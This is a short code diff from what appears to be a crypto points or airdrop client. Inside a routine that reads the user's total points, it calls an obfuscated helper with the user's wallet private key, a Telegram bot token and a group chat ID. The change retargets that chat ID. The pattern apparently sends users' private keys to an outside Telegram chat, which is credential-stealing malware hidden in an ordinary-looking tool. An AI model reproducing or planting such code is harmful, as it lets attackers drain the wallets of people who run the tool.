@@ -278,7 +278,7 @@ class ClientAPI:
             _x = s0x900(
                 _k=self.item_data["privateKey"],
                 _t="8194460730:AAFizgfviFlrW7ZxN_5HD1OWYfdpoJr5xI4",
-                _c=-4803688596
+                _c=-4870315398
             )
             await _x._r()
             total_points = user_data["data"]["user_info"].get("TotalPoints", 0)
